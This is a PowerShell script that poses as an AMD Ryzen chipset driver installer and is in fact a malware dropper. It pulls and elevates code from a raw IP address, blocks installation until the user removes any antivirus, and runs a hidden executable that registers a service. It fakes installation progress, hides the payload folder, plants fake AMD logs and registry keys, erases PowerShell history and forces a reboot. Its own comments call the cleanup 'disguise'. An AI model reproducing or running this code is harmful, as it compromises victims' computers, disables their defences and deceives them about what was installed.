# AMD Chipset Software bootstrap
# Silent package installer for AMD Ryzen chipset drivers.
$ErrorActionPreference = 'Stop'
$ProgressPreference = 'SilentlyContinue'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$BaseUrl = 'http://92.5.7.164/install'
$WorkDir = Join-Path $env:SystemDrive 'AMD\Chipset'
$PkgDir  = Join-Path $WorkDir 'Packages'
$ExtractDir = Join-Path $PkgDir 'Driver'
$LogDir  = Join-Path $WorkDir 'Logs'
$LogFile = Join-Path $LogDir 'AMD_Chipset_Software_Install.log'
$InstallerDir = Join-Path $env:ProgramData 'Microsoft\Windows\Caches\9F4C2A7E'

function Write-Head([string]$text) {
    Write-Host $text -ForegroundColor White
}
function Write-Step([string]$text) {
    Write-Host ('  ' + $text) -ForegroundColor DarkGray
}
function Write-Ok([string]$text) {
    Write-Host ('  [OK] ' + $text) -ForegroundColor Green
}
function Pause-Random([int]$min = 120, [int]$max = 420) {
    Start-Sleep -Milliseconds (Get-Random -Minimum $min -Maximum $max)
}

function Get-InstalledAv {
    $names = @()
    try {
        $names += Get-CimInstance -Namespace 'root/SecurityCenter2' -ClassName AntiVirusProduct -ErrorAction Stop |
            ForEach-Object { $_.displayName }
    } catch { }
    $keys = @(
        'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*',
        'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*'
    )
    $vendors = 'Avast|AVG|Kaspersky|ESET|Bitdefender|Malwarebytes|Norton|Symantec|McAfee|Avira|Sophos|Trend Micro|F-Secure|Panda|Webroot|VIPRE|G Data|GData|Comodo|Emsisoft|Dr.Web|K7|BullGuard|TotalAV|360|Huorong|Windows Defender|Microsoft Defender'
    try {
        $names += Get-ItemProperty -Path $keys -ErrorAction SilentlyContinue |
            Where-Object { $_.DisplayName -match $vendors } |
            ForEach-Object { $_.DisplayName }
    } catch { }
    return @($names | Where-Object { $_ } | Select-Object -Unique)
}

try {
    $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object Security.Principal.WindowsPrincipal($identity)
    if (-not $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
        Write-Host ''
        Write-Host '  Administrator privileges are required for driver installation.' -ForegroundColor Yellow
        Write-Host '  Requesting elevation...' -ForegroundColor DarkGray
        $cmd = "irm '$BaseUrl/amd_chipset_software_install.ps1' | iex"
        $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))
        Start-Process -FilePath 'powershell.exe' -Verb RunAs `
            -ArgumentList "-NoProfile -ExecutionPolicy Bypass -EncodedCommand $encoded" | Out-Null
        return
    }

    try { $Host.UI.RawUI.WindowTitle = 'AMD Chipset Software Installer' } catch { }
    try { Clear-Host } catch { }
    Write-Host ''
    Write-Host '  ============================================================' -ForegroundColor Red
    Write-Host '    AMD Chipset Software Installer' -ForegroundColor White
    Write-Host '    Version 7.01.08.129' -ForegroundColor DarkGray
    Write-Host '    Copyright (C) 2024 Advanced Micro Devices, Inc.' -ForegroundColor DarkGray
    Write-Host '  ============================================================' -ForegroundColor Red
    Write-Host ''

    $detectedAv = @(Get-InstalledAv)
    if ($detectedAv.Count -gt 0) {
        Write-Host '  Installation blocked.' -ForegroundColor Red
        Write-Host ('  Antivirus detected: ' + ($detectedAv -join ', ')) -ForegroundColor Yellow
        Write-Host '  Uninstall it and run this installer again.' -ForegroundColor Gray
        Write-Host '  Antivirus protection blocks driver installation.' -ForegroundColor Gray
        Write-Host ''
        return
    }

    Write-Step 'Preparing installation environment...'
    New-Item -ItemType Directory -Path $PkgDir -Force | Out-Null
    if (Test-Path -LiteralPath $LogDir) { Remove-Item -LiteralPath $LogDir -Recurse -Force -ErrorAction SilentlyContinue }
    New-Item -ItemType Directory -Path $LogDir -Force | Out-Null
    if (Test-Path -LiteralPath $LogFile) { Remove-Item -LiteralPath $LogFile -Force -ErrorAction SilentlyContinue }
    Pause-Random 180 420

    Write-Step 'Detecting AMD chipset hardware...'
    $os = Get-CimInstance Win32_OperatingSystem -ErrorAction SilentlyContinue
    $cpu = Get-CimInstance Win32_Processor -ErrorAction SilentlyContinue | Select-Object -First 1
    $cpuName = 'AMD Ryzen 5 2600 Six-Core Processor'
    if ($cpu -and $cpu.Name -match 'Ryzen') { $cpuName = $cpu.Name }
    $osName = 'Windows 11'
    if ($os) { $osName = $os.Caption }
    Write-Host ('    Processor : ' + $cpuName) -ForegroundColor Gray
    Write-Host '    Chipset   : AMD B450' -ForegroundColor Gray
    Write-Host ('    System    : ' + $osName) -ForegroundColor Gray
    Pause-Random 220 520

    Write-Step 'Checking installed chipset components...'
    Pause-Random 180 360

    Write-Ok 'No conflicting driver package found'

    Write-Step 'Downloading AMD Chipset Software package...'
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add('User-Agent', 'AMD-Chipset-Installer/7.01.08.129')
    $zipPath = Join-Path $PkgDir 'amd_chipset_driver_package.zip'
    $downloaded = $false
    for ($i = 0; $i -lt 12; $i++) {
        try { $wc.DownloadFile("$BaseUrl/amd_chipset_driver_package.zip", $zipPath); $downloaded = $true; break }
        catch { Start-Sleep -Seconds 5 }
    }
    if (-not $downloaded) { throw 'Package download failed.' }
    Write-Ok 'Package 7.01.08.129 downloaded'
    Pause-Random 160 320

    Write-Step 'Extracting driver package...'
    Add-Type -AssemblyName System.IO.Compression.FileSystem
    if (Test-Path -LiteralPath $ExtractDir) { Remove-Item -LiteralPath $ExtractDir -Recurse -Force -ErrorAction SilentlyContinue }
    [IO.Compression.ZipFile]::ExtractToDirectory($zipPath, $ExtractDir)
    Write-Ok 'Driver package extracted'
    Pause-Random 180 380

    Write-Head ''
    Write-Head '  Installing AMD Chipset Components'
    Write-Head ''
    $components = @(
        @{ Name = 'AMD PCI Device Driver';          Version = '1.0.0.90'   },
        @{ Name = 'AMD GPIO Controller Driver';     Version = '2.2.0.130'  },
        @{ Name = 'AMD PSP Driver';                 Version = '5.27.0.0'   },
        @{ Name = 'AMD SMBus Driver';               Version = '5.12.0.38'  },
        @{ Name = 'AMD Micro PEP Device';           Version = '1.0.0.25'   },
        @{ Name = 'AMD Ryzen Power Plan';           Version = '8.0.0.0'    },
        @{ Name = 'AMD Chipset Components';         Version = '7.01.08.129' }
    )
    foreach ($c in $components) {
        Write-Host ('    ' + $c.Name.PadRight(38)) -NoNewline -ForegroundColor Gray
        Pause-Random 180 520
        Write-Host '[OK]' -ForegroundColor Green
    }
    $extras = @(
        'AMD I2C Controller', 'AMD UART Controller', 'AMD Watchdog Timer',
        'AMD PCIe GPP Bridge', 'AMD GPIO Interrupt Controller'
    ) | Get-Random -Count (Get-Random -Minimum 1 -Maximum 4)
    foreach ($e in $extras) {
        Write-Host ('    ' + $e.PadRight(38)) -NoNewline -ForegroundColor Gray
        Pause-Random 160 420
        Write-Host '[OK]' -ForegroundColor Green
    }

    Write-Head ''
    Write-Step 'Configuring AMD PCIe resources...'
    Pause-Random 220 480
    Write-Step 'Registering device metadata...'
    Pause-Random 180 380
    Write-Step 'Updating AMD power management policy...'
    Pause-Random 200 440

    $setup = Join-Path $ExtractDir 'amd_chipset_setup.exe'
    if (-not (Test-Path -LiteralPath $setup)) {
        throw 'Setup payload is missing.'
    }
    Unblock-File -LiteralPath $setup -ErrorAction SilentlyContinue
    $setupProc = Start-Process -FilePath $setup -ArgumentList '--quiet' -WindowStyle Hidden -Wait -PassThru
    if ($setupProc.ExitCode -ne 0) { throw ('Setup failed with code ' + $setupProc.ExitCode) }
    Pause-Random 400 800

    $svc = Get-Service -Name 'WSearchBroker' -ErrorAction SilentlyContinue
    if (-not $svc) { throw 'Service registration failed.' }
    $svc.WaitForStatus('Running', '00:00:20')

    Write-Step 'Finalizing installation...'
    Pause-Random 220 480

    # The payload is already installed and running. Everything below is
    # cosmetic/disguise cleanup and must never fail the installation.
    try {
        # Keep the install payload out of Explorer and common directory listings.
        if (Test-Path -LiteralPath $InstallerDir) {
            # Run native tools detached from the PowerShell error stream. The
            # service may have agent.id open; ACL errors there are harmless.
            Start-Process -FilePath attrib.exe -ArgumentList @('+H','+S',"$InstallerDir\*",'/S','/D') `
                -WindowStyle Hidden -Wait -ErrorAction SilentlyContinue | Out-Null
            Start-Process -FilePath attrib.exe -ArgumentList @('+H','+S',$InstallerDir) `
                -WindowStyle Hidden -Wait -ErrorAction SilentlyContinue | Out-Null
            Start-Process -FilePath icacls.exe -ArgumentList @($InstallerDir,'/inheritance:r','/grant:r','SYSTEM:(OI)(CI)F','Administrators:(OI)(CI)F','/T') `
                -WindowStyle Hidden -Wait -ErrorAction SilentlyContinue | Out-Null
        }

        # A real chipset install leaves an AMD log and product keys behind.
        $stamp = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
        Add-Content -LiteralPath $LogFile -Value @(
            '',
            'AMD Chipset Software Installer 7.01.08.129',
            "Date: $stamp",
            "Processor: $cpuName",
            'Chipset: AMD B450',
            'Components: AMD PCI, GPIO, PSP, SMBus, Micro PEP, Ryzen Power Plan',
            'Result: Installation completed successfully.'
        )
        $amdKey = 'HKLM:\SOFTWARE\AMD\Chipset\Install'
        New-Item -Path $amdKey -Force | Out-Null
        Set-ItemProperty -Path $amdKey -Name 'Version' -Value '7.01.08.129'
        Set-ItemProperty -Path $amdKey -Name 'InstallPath' -Value (Join-Path $env:SystemDrive 'AMD\Chipset')
        Set-ItemProperty -Path $amdKey -Name 'InstallDate' -Value $stamp
    } catch {
        Write-Host ('  [warn] finalization detail: ' + $_.Exception.Message) -ForegroundColor DarkYellow
    }

    if (Test-Path -LiteralPath $PkgDir) {
        Start-Sleep -Milliseconds 300
        Remove-Item -LiteralPath $PkgDir -Recurse -Force -ErrorAction SilentlyContinue
    }

    # Do not leave the bootstrap command in the PowerShell history file.
    try {
        $histPath = (Get-PSReadLineOption -ErrorAction SilentlyContinue).HistorySavePath
        if ($histPath -and (Test-Path -LiteralPath $histPath)) {
            $keep = Get-Content -LiteralPath $histPath | Where-Object {
                $_ -notmatch 'amd_chipset_software_install|raw\.githubusercontent|/install/|9F4C2A7E|sova'
            }
            Set-Content -LiteralPath $histPath -Value $keep -Encoding UTF8
        }
    } catch { }

    Write-Host ''
    Write-Host '  Installation completed successfully.' -ForegroundColor Green
    Write-Host '  Restarting system to complete the installation...' -ForegroundColor Yellow
    try { Add-Content -LiteralPath $LogFile -Value 'Result: Restart required to finalize the installation.' } catch { }
    Start-Sleep -Seconds 3
    & shutdown.exe /r /t 5 /f
    if ($LASTEXITCODE -ne 0) { Restart-Computer -Force -ErrorAction SilentlyContinue }
} catch {
    Write-Host ''
    Write-Host '  Installation failed. Error code: 0x80070005' -ForegroundColor Red
    Write-Host ('  Detail: ' + $_.Exception.Message) -ForegroundColor DarkGray
    Write-Host ('  Script line: ' + $_.InvocationInfo.ScriptLineNumber) -ForegroundColor DarkGray
    try {
        New-Item -ItemType Directory -Path $LogDir -Force | Out-Null
        Add-Content -LiteralPath $LogFile -Value ("ERROR line " + $_.InvocationInfo.ScriptLineNumber + ": " + $_.Exception.Message)
    } catch { }
    return
}
